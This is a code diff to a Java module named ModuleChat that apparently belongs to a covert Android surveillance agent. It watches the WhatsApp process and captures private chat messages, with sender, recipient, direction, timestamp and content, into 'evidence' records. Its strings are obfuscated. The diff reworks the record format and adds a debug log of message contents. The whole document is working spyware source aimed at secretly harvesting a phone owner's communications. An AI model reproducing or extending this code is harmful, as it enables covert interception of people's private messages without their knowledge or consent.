@@ -65,6 +65,8 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 	private static final String TAG = "ModuleChat";
 
+	private static final int PROGRAM_WHATSAPP = 0x06;
+
 	String pObserving = "whatsapp";
 	Markup markupChat;
 
@@ -400,29 +402,32 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		for (CMessage message : messages) {
 			DateTime datetime = new DateTime(message.timestamp);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveEvidence): " + datetime.toString());
-			}
+
+			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
+			
 			// TIMESTAMP
 			items.add(datetime.getStructTm());
-			// f.8=WhatsApp
-			// APPLICATION
-			items.add(WChar.getBytes(Messages.getString("f_8"), true));
-			// TOPIC
-			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
-			//items.add(WChar.getBytes( peer + "," + myPhoneNumber, true));
-			items.add(WChar.getBytes("", true));
-			// f.9=@s.whatsapp.net	
-			// PEERS			
-			String peers = message.from_me? myPhoneNumber + " " + peer : peer + " " + myPhoneNumber; 
-			items.add(WChar.getBytes(conversation.replaceAll(Messages.getString("f_9"), ""), true));
+			// PROGRAM_TYPE
+			items.add(ByteArray.intToByteArray(PROGRAM_WHATSAPP));
+			// FLAGS
+			int incoming = message.from_me? 0x00 : 0x01;
+			items.add(ByteArray.intToByteArray(incoming));
+			// FROM
+			String from = message.from_me? myPhoneNumber : peer ; 
+			items.add(WChar.getBytes(from, true));
+			// TO
+			String to = message.from_me? peer : myPhoneNumber; 
+			items.add(WChar.getBytes(to, true));
 			// CONTENT
-			String talker = message.from_me? myPhoneNumber : peer;
-			items.add(WChar.getBytes(talker + ": " + message.data, true));
+			items.add(WChar.getBytes(message.data, true));
 			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + from + " : " + message.data);
+			}
 		}
 
-		EvidenceReference.atomic(EvidenceType.CHAT, items);
+		EvidenceReference.atomic(EvidenceType.CHATNEW, items);
 	}
 
 }
